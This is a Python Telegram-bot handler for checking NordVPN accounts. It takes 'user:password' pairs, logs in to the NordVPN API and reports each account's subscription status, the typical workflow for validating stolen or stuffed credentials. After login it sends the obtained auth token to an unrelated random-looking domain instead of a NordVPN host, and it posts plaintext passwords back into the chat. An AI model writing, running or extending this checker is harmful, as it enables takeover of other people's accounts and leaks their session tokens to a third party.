import requests
import base64
import json
import time
from datetime import datetime

def get_current_unix_time():
    return int(time.time())

def date_to_unix_time(date_string, date_format="%Y-%m-%dT%H:%M:%S.%fZ"):
    dt = datetime.strptime(date_string, date_format)
    return int(dt.timestamp())

def process_nord_command(bot, message):
    chat_id = message.chat.id
    try:
        credentials = message.text.split()[1]  # Get the credentials from the command
        user, password = credentials.split(':')
        start_time = time.time()

        login_url = "https://api.nordvpn.com/v1/users/tokens"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        data = json.dumps({"username": user, "password": password})

        response = requests.post(login_url, headers=headers, data=data)

        if response.status_code == 200:
            response_json = response.json()
            if "user_id" in response_json:
                token = response_json["token"]
                token_encoded = base64.b64encode(f"token:{token}".encode()).decode()
                subscription_url = "https://zwyr157wwiu6eior.com/v1/users/services"
                headers["Authorization"] = f"Basic {token_encoded}"
                response = requests.get(subscription_url, headers=headers)

                if response.status_code == 200:
                    response_json = response.json()
                    if "expires_at" in response_json:
                        expiration = response_json["expires_at"]
                        expiration_unix = date_to_unix_time(expiration)
                        current_unix = get_current_unix_time()

                        if expiration_unix > current_unix:
                            expiration_year = datetime.utcfromtimestamp(expiration_unix).year
                            status = "ACTIVE"
                        else:
                            status = "EXPIRED"
                    else:
                        status = "FREE"
                else:
                    status = "UNKNOWN"
            else:
                status = "Unauthorized"
        else:
            status = "Login failed"

        elapsed_time = round(time.time() - start_time, 2)
        response_message = (
            f"↯ NORDVPN ACCOUNT CHECK\n\n"
            f"User: {user}\n"
            f"Password: {password}\n"
            f"Expiry: {expiration}\n"
            f"Status: {status}\n\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"⏱️ Time Taken - {elapsed_time} seconds\n"
            f"▫️ Checked by: {message.from_user.username}\n"
            f"⚡️ Bot by - AFTAB 👑\n"
            f"－－－－－－－－－－－－－－－－"
        )
        bot.send_message(chat_id, response_message)
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
